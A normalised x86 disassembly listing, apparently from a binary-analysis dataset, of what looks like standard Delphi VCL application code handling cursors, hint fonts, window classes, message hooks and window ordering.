mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041cc
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041cc
sub_459620
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45be80
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bc34
mov dl 0x1
mov eax [ rw-data ]
call sub_45bc34
sub_45968c
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_4596b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45968c
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_40688c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406814
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_459744
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_459889
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bc34
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c680
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c680
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c764
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c680
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c680
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c680
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45bc34
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c4c4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c4c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459890
cmp [ rw-data ] 0x0
je r-xdata
sub_4598c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_459928
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_459a64 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_459ad8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_459230
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413918
mov dl [ ebp - 0x1 ]
call sub_459928
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45921c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4137bc
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413994
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413918
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_4598c8
test al al
je r-xdata
inc esi
sub_459c24
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_459230
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45921c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_459c7c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_459c24
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_459cf6
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_459ad8
pop ecx
push ebp
mov al 0x2
call sub_459ad8
pop ecx
push ebp
mov al 0x3
call sub_459ad8
pop ecx
push ebp
mov al 0x4
call sub_459ad8
pop ecx
push ebp
mov al 0x5
call sub_459ad8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403224
retn
sub_459d04
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_459898
xor eax eax
push ebp
push sub_459d7d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_459c7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4598a0
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_459d98
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f5c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fb0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_459df0
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4036ac#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45c23c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_459e44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43a444
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45c2b8
sub_459ea0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45b358
sub_459ee4
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_459ea0
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_459e44
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_459f58
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_459fb4
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_459fe4
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45a00c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_459fb4
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_459fe4
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_459fe4
sub_45a04c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4193f0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45b724
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214b8
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_421888
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45bebc
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c12c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45b91c
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c154
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4084b8
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45c098
mov eax ebx
call sub_45ca5c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45a354
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_45a235
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_45ca6c
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45b724
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45b91c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45c2b8
xor edx edx
mov eax esi
call sub_45bc34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41943c
push esi
push sub_45a788
mov eax esi
call sub_45b510
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405598
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403224
mov eax [ esi + 0x90 ]
call sub_403224
mov eax [ esi + 0x98 ]
call sub_403224
test bl bl
jle r-xdata
call sub_41a518
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_45a354
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403960#8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a4fc
lea eax [ ebp - 0x2c ]
call sub_403f5c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45a8d4
call sub_41a480
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40441c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406914
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f5c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45afd8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45afd8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45a504
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_459238
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45a564
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4137bc
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4423cc
cmp ebx eax
je r-xdata
sub_45a5d4
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45a564
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413918
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45a6ec
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413918
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45a788
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c3f4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_459744
mov eax [ rw-data ]
